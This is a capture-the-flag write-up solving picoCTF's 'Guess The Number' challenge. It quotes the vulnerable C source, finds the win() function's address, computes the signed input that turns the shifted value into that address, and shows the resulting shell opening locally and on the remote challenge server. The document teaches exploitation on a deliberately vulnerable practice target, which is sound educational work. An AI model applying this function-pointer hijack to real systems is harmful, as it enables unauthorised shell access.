# Guess The Number [ 75 Pts ]

## Problem

Just a simple number-guessing game. How hard could it be? [Binary](./guess_num) [Source](./guess_num.c). Connect on shell2017.picoctf.com:30919.

## Approach

```C
/* How well do you know your numbers? */

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

void win(void) {
    printf("Congratulations! Have a shell:\n");
    system("/bin/sh -i");
}

int main(int argc, char **argv) {
    uintptr_t val;
    char buf[32] = "";

    /* Turn off buffering so we can see output right away */
    setbuf(stdout, NULL);

    printf("Welcome to the number guessing game!\n");
    printf("I'm thinking of a number. Can you guess it?\n");
    printf("Guess right and you get a shell!\n");

    printf("Enter your number: ");
    scanf("%32s", buf);
    val = strtol(buf, NULL, 10);

    printf("You entered %d. Let's see if it was right...\n", val);

    val >>= 4;
    ((void (*)(void))val)();
}

```

From the above source code, we see val becoming a function pointer. 
What we have to do is to provide a number that when divided by 16 would give the address of `win()`.

```
$ readelf -s guess_num | grep win
    61: 0804852b    40 FUNC    GLOBAL DEFAULT   13 win
```
The program is ELF32. From the man page, we see that uintptr_t is the same size of a pointer which is 32 bit.


`long int strtol(const char *nptr, char **endptr, int base);`

From the man page, we also see that strtol returns long int.
This means that the MSB is a sign bit.

```
Python 2.7.12 (default, Dec  4 2017, 14:50:18) 
[GCC 5.4.0 20160609] on linux2
Type "help", "copyright", "credits" or "license" for more information.

>>> format(0x0804852b, '032b')
'00001000000001001000010100101011'

>>> format(0x0804852b<<4, '032b')
'10000000010010000101001010110000'
```
By shifting left 4 times, the left most '1' will become a sign bit.
We will need to calculate the 2's complement to get the scale.

2's complement is calculated by flipping all the bits and + 1.

```
>>> format(0x0804852b<<4 ^ 0xffffffff, '032b')
'01111111101101111010110101001111'

>>> format((0x0804852b<<4 ^ 0xffffffff) + 1, '032b')
'01111111101101111010110101010000'

>>> (0x0804852b<<4 ^ 0xffffffff) + 1
2142743888

```

## Local

Now we only have to input -2142743888 to get a shell locally

```
$ ./guess_num 
Welcome to the number guessing game!
I'm thinking of a number. Can you guess it?
Guess right and you get a shell!
Enter your number: -2142743888
You entered -2142743888. Let's see if it was right...
Congratulations! Have a shell:
$ ls
guess_num  guess_num.c	WRITEUP.md

```

## Remote

```
$ nc shell2017.picoctf.com 30919
Welcome to the number guessing game!
I'm thinking of a number. Can you guess it?
Guess right and you get a shell!
Enter your number: -2142743888
You entered -2142743888. Let's see if it was right...
Congratulations! Have a shell:
/bin/sh: 0: can't access tty; job control turned off
$ ls
flag.txt
guess_num
xinetd_wrapper.sh
$ cat flag.txt	
d1ec8d4078eac1112548c1a6a00cfe07
```

(Completed)
